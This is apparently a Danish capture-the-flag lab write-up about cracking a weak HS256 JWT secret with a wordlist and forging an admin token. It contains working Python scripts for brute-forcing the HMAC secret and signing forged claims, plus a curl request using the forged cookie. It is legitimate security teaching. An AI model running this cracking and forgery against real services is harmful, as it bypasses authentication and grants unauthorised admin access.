JWT

Knæk en svag HS256-secret og forfalsk admin-claims.

📚 Baggrund: denne opgave bygger på en fælles teknik — læs primeren: Kom i gang: VPN, Hosts og lab-opsætning.

Hvad går opgaven ud på?

Login sætter en jwt-cookie med {"user":"guest"} (HS256). Hintet ("JohnTheRipper") = knæk secret'en med en wordlist, så kan du forge vilkårlige claims.

Knæk secret'en

Tag header.payload-delen af din egen (gæste-)token og den signatur du fik, og prøv rockyou mod HMAC-SHA256 indtil den matcher:

python3 -c "
import hmac, hashlib, base64
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
si = b'<header>.<payload>'   # de to første dot-separerede dele af din egen jwt-cookie
sig = '<signature>'               # den tredje del
for w in open('rockyou.txt', 'rb'):
    w = w.rstrip(b'\n')
    if b64u(hmac.new(w, si, hashlib.sha256).digest()) == sig:
        print(w); break"
# -> secret'en (fx 'challenge')

Alternativt hashcat -m 16500 eller jwt_tool hvis du foretrækker et færdigt værktøj.

Forge admin-claims

python3 -c "
import hmac, hashlib, base64
b64u = lambda b: base64.urlsafe_b64encode(b).rstrip(b'=').decode()
h = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')
p = b64u(b'{\"user\":\"admin\"}')
sig = b64u(hmac.new(b'challenge', (h+'.'+p).encode(), hashlib.sha256).digest())
print(f'{h}.{p}.{sig}')"
curl -b "jwt=<token-fra-ovenstående>" http://jwt.com/user

Genberegn med samme serialisering som originalen (ingen mellemrum i JSON'en), ellers matcher signaturen ikke.

Hvad du har lært

  • JWT HS256: hele sikkerheden er secret'en; svag secret → forge vilkårlige claims.
  • Signaturen dækker base64url(header).base64url(payload) — samme serialisering.
  • Beslægtet: FartCorp (lækket secret) og Serializator.
